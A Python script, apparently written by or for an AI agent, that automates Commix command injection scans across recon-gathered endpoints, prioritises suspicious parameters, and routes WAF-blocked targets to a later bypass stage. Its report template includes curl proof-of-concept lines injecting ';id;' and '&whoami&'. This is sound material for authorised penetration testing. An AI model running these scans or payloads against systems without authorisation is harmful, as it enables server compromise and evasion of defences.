#!/usr/bin/env python3
"""
Task 46: Commix Command Injection Scanner - AI Brain
=====================================================

Automated command injection testing using Commix on ALL parameterized endpoints.
Prioritizes command-like parameters and adapts to detected OS/WAF.

Author: Jules AI Agent
Mode: AUTOMATED CMDi SCANNING
"""

import os
import sys
import json
import subprocess
import re
import hashlib
import logging
import argparse
import time
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# =============================================================================
# PARAMETER PRIORITY PATTERNS
# =============================================================================

# Highest Priority - Direct command execution patterns
CRITICAL_PARAMS = {
    'cmd', 'command', 'exec', 'execute', 'run', 'shell',
    'ping', 'query', 'jump', 'code', 'reg', 'do', 'func',
    'arg', 'option', 'load', 'process', 'step', 'read',
    'function', 'req', 'feature', 'exe', 'module', 'payload',
    'cli', 'daemon', 'upload', 'dir', 'download', 'log',
}

# High Priority - System interaction patterns
SYSTEM_PARAMS = {
    'host', 'ip', 'hostname', 'domain', 'server', 'port',
    'path', 'file', 'folder', 'doc', 'mail', 'email',
    'url', 'uri', 'src', 'source', 'dest', 'destination',
    'to', 'from', 'target', 'address', 'name', 'filename',
}

# Medium Priority - Action/debug patterns
ACTION_PARAMS = {
    'action', 'type', 'mode', 'debug', 'test', 'config',
    'cfg', 'env', 'setting', 'template', 'format', 'output',
    'callback', 'return', 'redirect', 'continue', 'checkout',
}


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class CMDiTarget:
    """Target for command injection testing."""
    url: str
    host: str
    params: List[str]
    method: str = 'GET'
    data: Optional[str] = None
    priority: int = 0
    source: str = ''


@dataclass
class CMDiResult:
    """Result of command injection scan."""
    url: str
    status: str  # vulnerable, possible, waf_blocked, clean, error
    technique: Optional[str] = None
    parameter: Optional[str] = None
    payload: Optional[str] = None
    os_type: Optional[str] = None
    evidence: Optional[str] = None
    error: Optional[str] = None
    scan_time: float = 0.0


# =============================================================================
# TARGET COLLECTOR
# =============================================================================

class CMDiTargetCollector:
    """Collect and prioritize targets for CMDi testing."""
    
    INPUT_SOURCES = [
        ('outputs/queue_dynamic_endpoints_urls.txt', 'dynamic_urls'),
        ('outputs/arjun_found_params.txt', 'arjun'),
        ('outputs/zap/injection_candidates.txt', 'zap'),
        ('outputs/api_endpoints_live.txt', 'api'),
        ('outputs/queue_api_endpoints_kiterunner.txt', 'kiterunner'),
        ('outputs/har/common_data.txt', 'har'),
    ]
    
    def __init__(self, workspace: Path):
        self.workspace = workspace
        self.targets: List[CMDiTarget] = []
        self.seen_urls: Set[str] = set()
    
    def collect_all(self) -> List[CMDiTarget]:
        """Collect targets from all sources."""
        logger.info("=" * 60)
        logger.info("COLLECTING CMDi TARGETS")
        logger.info("=" * 60)
        
        for file_path, source in self.INPUT_SOURCES:
            full_path = self.workspace / file_path
            if full_path.exists():
                count = self._load_from_file(full_path, source)
                if count > 0:
                    logger.info(f"  [{source}] {count} targets from {file_path}")
        
        # Sort by priority (highest first)
        self.targets.sort(key=lambda t: t.priority, reverse=True)
        
        logger.info(f"\nTOTAL: {len(self.targets)} unique CMDi targets")
        logger.info("=" * 60)
        
        return self.targets
    
    def _load_from_file(self, path: Path, source: str) -> int:
        """Load URLs from file."""
        count = 0
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Extract URL
                    url = None
                    if line.startswith('http'):
                        url = line.split()[0]  # Handle "URL param1 param2" format
                    elif ' ' in line and 'http' in line:
                        parts = line.split()
                        for p in parts:
                            if p.startswith('http'):
                                url = p
                                break
                    
                    if url and url not in self.seen_urls:
                        target = self._create_target(url, source)
                        if target:
                            self.targets.append(target)
                            self.seen_urls.add(url)
                            count += 1
        except Exception as e:
            logger.warning(f"Error reading {path}: {e}")
        
        return count
    
    def _create_target(self, url: str, source: str) -> Optional[CMDiTarget]:
        """Create target with priority scoring."""
        try:
            parsed = urlparse(url)
            params = []
            
            if parsed.query:
                query_params = parse_qs(parsed.query)
                params = list(query_params.keys())
            
            if not params:
                return None  # Skip URLs without params
            
            # Calculate priority based on param names
            priority = 0
            for param in params:
                param_lower = param.lower()
                if param_lower in CRITICAL_PARAMS:
                    priority += 100
                elif param_lower in SYSTEM_PARAMS:
                    priority += 50
                elif param_lower in ACTION_PARAMS:
                    priority += 25
                else:
                    priority += 5
            
            return CMDiTarget(
                url=url,
                host=parsed.netloc,
                params=params,
                priority=priority,
                source=source
            )
        except:
            return None


# =============================================================================
# INTELLIGENCE LOADER
# =============================================================================

class IntelligenceLoader:
    """Load WAF and tech detection info."""
    
    def __init__(self, workspace: Path):
        self.workspace = workspace
        self.host_waf: Dict[str, str] = {}
        self.host_os: Dict[str, str] = {}
        self._load_waf_info()
        self._load_tech_info()
    
    def _load_waf_info(self):
        """Load WAF detection from Task 32."""
        waf_file = self.workspace / 'outputs' / 'waf' / 'waf_results.json'
        if waf_file.exists():
            try:
                with open(waf_file, 'r') as f:
                    data = json.load(f)
                if isinstance(data, dict):
                    self.host_waf = {k: v.lower() for k, v in data.items() if v}
                elif isinstance(data, list):
                    for item in data:
                        host = item.get('host', item.get('url', ''))
                        waf = item.get('waf', '')
                        if host and waf:
                            self.host_waf[host] = waf.lower()
            except:
                pass
    
    def _load_tech_info(self):
        """Load tech detection from Nuclei brain."""
        brain_file = self.workspace / 'outputs' / 'nuclei' / 'brain_knowledge.json'
        if brain_file.exists():
            try:
                with open(brain_file, 'r') as f:
                    data = json.load(f)
                
                tech_to_hosts = data.get('tech_to_hosts', {})
                
                # Detect OS from tech
                for tech, hosts in tech_to_hosts.items():
                    tech_lower = tech.lower()
                    if 'windows' in tech_lower or 'iis' in tech_lower or 'asp' in tech_lower:
                        os_type = 'windows'
                    elif any(x in tech_lower for x in ['linux', 'apache', 'nginx', 'php', 'ubuntu', 'debian']):
                        os_type = 'unix'
                    else:
                        continue
                    
                    for host in hosts:
                        if host not in self.host_os:
                            self.host_os[host] = os_type
            except:
                pass
    
    def get_waf(self, host: str) -> Optional[str]:
        """Get WAF for host."""
        return self.host_waf.get(host)
    
    def get_os(self, host: str) -> str:
        """Get OS for host (default: unix)."""
        return self.host_os.get(host, 'unix')


# =============================================================================
# COMMIX SCANNER
# =============================================================================

class CommixScanner:
    """Command injection scanner using Commix."""
    
    BATCH_TIME_LIMIT = 540  # 9 minutes
    SCAN_TIMEOUT = 180  # 3 minutes per URL
    
    def __init__(self, workspace: Path, output_dir: Path, temp_dir: Path):
        self.workspace = workspace
        self.output_dir = output_dir
        self.temp_dir = temp_dir
        
        # Create directories
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        (self.workspace / 'outputs' / 'vulnerabilities').mkdir(parents=True, exist_ok=True)
        
        # Commix output dir
        self.commix_output = self.temp_dir / 'commix_output'
        self.commix_output.mkdir(exist_ok=True)
        
        # Load intelligence
        self.intel = IntelligenceLoader(workspace)
        
        # Results
        self.results: List[CMDiResult] = []
        
        # Checkpoint
        self.checkpoint_file = self.temp_dir / 'checkpoint.json'
    
    def scan_all(self, targets: List[CMDiTarget], resume: bool = False, priority_only: bool = False):
        """Scan all targets."""
        logger.info("=" * 60)
        logger.info("STARTING COMMIX CMDi SCAN")
        logger.info("=" * 60)
        
        # Filter priority only
        if priority_only:
            targets = [t for t in targets if t.priority >= 50]
            logger.info(f"Priority filter: {len(targets)} high-priority targets")
        
        # Resume
        start_idx = 0
        if resume:
            checkpoint = self._load_checkpoint()
            start_idx = checkpoint.get('last_completed', 0)
            logger.info(f"[RESUME] Starting from index {start_idx}")
        
        total = len(targets)
        batch_start = time.time()
        
        for i, target in enumerate(targets[start_idx:], start=start_idx):
            # Time check
            elapsed = time.time() - batch_start
            if elapsed > self.BATCH_TIME_LIMIT:
                logger.info(f"[BATCH] Time limit reached at {i}/{total}")
                self._save_checkpoint(i)
                break
            
            # Get intelligence
            waf = self.intel.get_waf(target.host)
            os_type = self.intel.get_os(target.host)
            
            # Determine scan level based on priority
            level = 3 if target.priority >= 50 else 1
            
            logger.info(f"[{i+1}/{total}] Scanning: {target.url[:70]}...")
            logger.info(f"  Params: {target.params[:3]}... Priority: {target.priority}, OS: {os_type}")
            
            # Scan
            result = self._scan_single(target, level, os_type, waf)
            self.results.append(result)
            
            # Report status
            if result.status == 'vulnerable':
                logger.info(f"  [VULN!] CMDi confirmed: {result.technique} on {result.parameter}")
                self._write_vuln_report(result)
            elif result.status == 'possible':
                logger.info(f"  [POSSIBLE] May be vulnerable")
            elif result.status == 'waf_blocked':
                logger.info(f"  [WAF] Blocked - queued for Task 47 bypass")
            
            # Checkpoint
            if (i + 1) % 10 == 0:
                self._save_checkpoint(i + 1)
        
        # Final save
        self._save_results()
        
        logger.info("\n" + "=" * 60)
        vuln_count = sum(1 for r in self.results if r.status == 'vulnerable')
        blocked_count = sum(1 for r in self.results if r.status == 'waf_blocked')
        logger.info(f"SCAN COMPLETE: {len(self.results)} URLs tested")
        logger.info(f"  Vulnerable: {vuln_count}")
        logger.info(f"  WAF Blocked: {blocked_count} (queued for Task 47)")
        logger.info("=" * 60)
    
    def _scan_single(self, target: CMDiTarget, level: int, os_type: str, waf: Optional[str]) -> CMDiResult:
        """Scan single URL with Commix."""
        start_time = time.time()
        
        result = CMDiResult(
            url=target.url,
            status='clean'
        )
        
        # Build commix command
        cmd = [
            'commix',
            '--url', target.url,
            '--batch',
            f'--level={level}',
            '--technique=CT',  # Classic + Time-based
            '--output-dir', str(self.commix_output),
        ]
        
        # Add OS hint
        if os_type:
            cmd.extend(['--os', os_type])
        
        # Add timeout
        cmd.extend(['--timeout', '30'])
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.SCAN_TIMEOUT,
                cwd=str(self.workspace)
            )
            
            output = proc.stdout + proc.stderr
            
            # Parse Commix output
            if self._is_vulnerable(output):
                result.status = 'vulnerable'
                result.technique = self._extract_technique(output)
                result.parameter = self._extract_parameter(output)
                result.payload = self._extract_payload(output)
                result.os_type = self._extract_os(output) or os_type
                result.evidence = output[:2000]
            elif self._is_waf_blocked(output):
                result.status = 'waf_blocked'
                result.error = 'WAF/IPS blocking requests'
            elif self._is_possible(output):
                result.status = 'possible'
                result.evidence = output[:1000]
            
        except subprocess.TimeoutExpired:
            result.status = 'possible'  # Timeout often indicates blind injection
            result.error = 'timeout'
        except FileNotFoundError:
            result.status = 'error'
            result.error = 'commix not installed'
            logger.error("Commix not found! Install with: pip install commix")
        except Exception as e:
            result.status = 'error'
            result.error = str(e)
        
        result.scan_time = time.time() - start_time
        return result
    
    def _is_vulnerable(self, output: str) -> bool:
        """Check if output indicates confirmed CMDi."""
        vuln_indicators = [
            'is vulnerable',
            'injectable',
            'command injection',
            'os command injection',
            '[success]',
            'the target appears to be injectable',
            'the following os shell',
            'pseudo-terminal shell',
        ]
        output_lower = output.lower()
        return any(ind in output_lower for ind in vuln_indicators)
    
    def _is_waf_blocked(self, output: str) -> bool:
        """Check if blocked by WAF."""
        waf_indicators = [
            'waf/ips',
            'blocked',
            'forbidden',
            '403',
            'access denied',
            'rate limit',
            'security',
        ]
        output_lower = output.lower()
        return any(ind in output_lower for ind in waf_indicators)
    
    def _is_possible(self, output: str) -> bool:
        """Check for possible CMDi."""
        possible_indicators = [
            'heuristic',
            'testing',
            'might be',
            'potentially',
            'time-based',
        ]
        output_lower = output.lower()
        return any(ind in output_lower for ind in possible_indicators)
    
    def _extract_technique(self, output: str) -> Optional[str]:
        """Extract injection technique."""
        techniques = {
            'classic': 'Results-based (Classic)',
            'time-based': 'Time-based blind',
            'file-based': 'File-based',
            'eval-based': 'Eval-based',
        }
        output_lower = output.lower()
        for key, name in techniques.items():
            if key in output_lower:
                return name
        return 'Unknown'
    
    def _extract_parameter(self, output: str) -> Optional[str]:
        """Extract vulnerable parameter."""
        param_match = re.search(r'parameter[:\s]+["\']?(\w+)["\']?', output, re.IGNORECASE)
        if param_match:
            return param_match.group(1)
        return None
    
    def _extract_payload(self, output: str) -> Optional[str]:
        """Extract successful payload."""
        payload_match = re.search(r'payload[:\s]+["\']?([^"\']+)["\']?', output, re.IGNORECASE)
        if payload_match:
            return payload_match.group(1)[:200]
        return None
    
    def _extract_os(self, output: str) -> Optional[str]:
        """Extract detected OS."""
        if 'linux' in output.lower() or 'unix' in output.lower():
            return 'Linux/Unix'
        elif 'windows' in output.lower():
            return 'Windows'
        return None
    
    def _write_vuln_report(self, result: CMDiResult):
        """Write vulnerability report."""
        vuln_dir = self.workspace / 'outputs' / 'vulnerabilities'
        vuln_id = hashlib.md5(result.url.encode()).hexdigest()[:8]
        report_path = vuln_dir / f"CMDI-{vuln_id}-CRITICAL.md"
        
        parsed = urlparse(result.url)
        
        report = f"""# Command Injection: CMDI-{vuln_id}

## Summary
| Field | Value |
|-------|-------|
| **ID** | CMDI-{vuln_id} |
| **URL** | {result.url} |
| **Host** | {parsed.netloc} |
| **Parameter** | {result.parameter or 'See evidence'} |
| **Technique** | {result.technique} |
| **OS** | {result.os_type or 'Unknown'} |
| **Severity** | CRITICAL |
| **Discovered** | {datetime.now().isoformat()} |
| **Scanner** | Commix (Task 46) |

## Vulnerable URL
```
{result.url}
```

## Payload
```
{result.payload or 'See evidence below'}
```

## Evidence (Commix Output)
```
{result.evidence or 'No detailed evidence captured'}
```

## Impact

Command Injection allows an attacker to:
- **Remote Code Execution (RCE)**: Execute arbitrary OS commands
- **Full Server Compromise**: Complete control of the server
- **Data Exfiltration**: Read any file, dump databases
- **Lateral Movement**: Pivot to other systems
- **Persistence**: Install backdoors, add users

## Proof of Concept

```bash
# Reproduce with Commix:
commix --url="{result.url}" --batch

# Manual test (Unix):
curl "{result.url.replace('=', '=;id;')}"

# Manual test (Windows):
curl "{result.url.replace('=', '=&whoami&')}"
```

## Recommendations

1. **IMMEDIATE**: Never pass user input to shell commands
2. **IMMEDIATE**: Use allowlist validation for expected values
3. **SHORT-TERM**: Use parameterized APIs (subprocess with list args, not shell=True)
4. **SHORT-TERM**: Implement input sanitization (reject ; | & ` $ etc.)
5. **LONG-TERM**: Conduct secure code review of all shell interactions

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
"""
        
        with open(report_path, 'w') as f:
            f.write(report)
        
        logger.info(f"  [REPORT] {report_path.name}")
    
    def _load_checkpoint(self) -> Dict:
        """Load checkpoint."""
        if self.checkpoint_file.exists():
            try:
                with open(self.checkpoint_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {}
    
    def _save_checkpoint(self, last_completed: int):
        """Save checkpoint."""
        checkpoint = {
            'last_completed': last_completed,
            'timestamp': datetime.now().isoformat(),
        }
        with open(self.checkpoint_file, 'w') as f:
            json.dump(checkpoint, f, indent=2)
    
    def _save_results(self):
        """Save all results."""
        # Vulnerable URLs
        vuln_file = self.output_dir / 'commix_vulnerable.txt'
        with open(vuln_file, 'w') as f:
            for r in self.results:
                if r.status == 'vulnerable':
                    f.write(f"{r.url}\n")
        
        # Possible URLs
        poss_file = self.output_dir / 'commix_possible.txt'
        with open(poss_file, 'w') as f:
            for r in self.results:
                if r.status == 'possible':
                    f.write(f"{r.url}\n")
        
        # WAF blocked → Task 47
        blocked_file = self.output_dir / 'task47_targets.txt'
        with open(blocked_file, 'w') as f:
            for r in self.results:
                if r.status in ['waf_blocked', 'possible']:
                    f.write(f"{r.url}\n")
        
        # Full JSON
        full_results = {
            'scan_time': datetime.now().isoformat(),
            'total_scanned': len(self.results),
            'vulnerable': sum(1 for r in self.results if r.status == 'vulnerable'),
            'waf_blocked': sum(1 for r in self.results if r.status == 'waf_blocked'),
            'results': [
                {
                    'url': r.url,
                    'status': r.status,
                    'technique': r.technique,
                    'parameter': r.parameter,
                    'os_type': r.os_type,
                }
                for r in self.results
                if r.status in ['vulnerable', 'possible', 'waf_blocked']
            ]
        }
        
        results_file = self.output_dir / 'commix_results.json'
        with open(results_file, 'w') as f:
            json.dump(full_results, f, indent=2)
        
        logger.info(f"[SAVE] Results saved to {self.output_dir}")
        
        blocked_count = sum(1 for r in self.results if r.status in ['waf_blocked', 'possible'])
        if blocked_count > 0:
            logger.info(f"[TASK47] {blocked_count} targets queued for bypass testing")


# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Task 46: Commix Command Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    parser.add_argument('--workspace', required=True, help='Path to workspace root')
    parser.add_argument('--output', default='outputs/cmdi', help='Output directory')
    parser.add_argument('--temp', default='temp/task46', help='Temp directory')
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    parser.add_argument('--priority-only', action='store_true', help='Only test high-priority params')
    parser.add_argument('--max-targets', type=int, default=0, help='Max targets (0=all)')
    parser.add_argument('--url', help='Test specific URL')
    
    args = parser.parse_args()
    
    workspace = Path(args.workspace)
    output_dir = workspace / args.output
    temp_dir = workspace / args.temp
    
    # Collect or use specific URL
    if args.url:
        parsed = urlparse(args.url)
        params = list(parse_qs(parsed.query).keys()) if parsed.query else ['test']
        targets = [CMDiTarget(
            url=args.url,
            host=parsed.netloc,
            params=params,
            priority=100,
            source='cli'
        )]
    else:
        collector = CMDiTargetCollector(workspace)
        targets = collector.collect_all()
    
    if not targets:
        logger.error("No CMDi targets found!")
        sys.exit(1)
    
    # Limit
    if args.max_targets > 0:
        targets = targets[:args.max_targets]
    
    # Scan
    scanner = CommixScanner(workspace, output_dir, temp_dir)
    scanner.scan_all(targets, resume=args.resume, priority_only=args.priority_only)


if __name__ == "__main__":
    main()
